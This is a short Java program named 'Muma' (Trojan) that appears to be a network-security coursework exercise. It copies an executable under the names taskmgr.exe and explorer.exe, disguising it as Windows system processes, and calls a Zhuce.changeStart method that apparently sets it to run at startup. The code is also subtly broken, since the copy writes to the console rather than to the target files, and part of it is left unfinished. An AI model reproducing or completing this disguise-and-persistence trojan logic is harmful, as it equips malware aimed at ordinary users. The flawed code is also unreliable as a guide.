import java.io.*;

import static java.lang.System.out;

public class Muma {

    public void Kaobei(String str1, String str2, String str3) {

        try {
            copy(str1, str2, str3);
            Zhuce zhuce = new Zhuce();

            zhuce.changeStart(true, str2, str3);

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void copy(String str1, String str2, String str3) throws Exception {
        FileInputStream in = new FileInputStream(new File(str1));
        FileOutputStream out1 = new FileOutputStream(new File(str2));
        FileOutputStream out2 = new FileOutputStream(new File(str3));
        byte[] buff = new byte[512];
        int n = 0;
        out.println("复制文件：" + "\n" + "源路径：" + str1 + "\n" + "目标路径："
                + str2 + "\n" + str3);
        while ((n = in.read(buff)) != -1) {
            out.write(buff, 0, n);
        }
        out.flush();
        in.close();
        out.close();
        out.println("复制完成");

       /*File f1 = new File(str1);
       File f2 = new File(str2);
       File ff3 = new File(str3);
        InputStreamReader reader = new InputStreamReader(new FileInputStream(f1));
        BufferedReader bufferedReader = new BufferedReader(reader);
        String line;
        while()*/
    }

    public static void main(String[] args){
        Muma muma = new Muma();
        String str1 = "E://网络攻防//a.exe";
        String str2 = "E://网络攻防//taskmgr.exe";
        String str3 = "E://网络攻防/explorer.exe";
        muma.Kaobei(str1, str2, str3);


    }
}

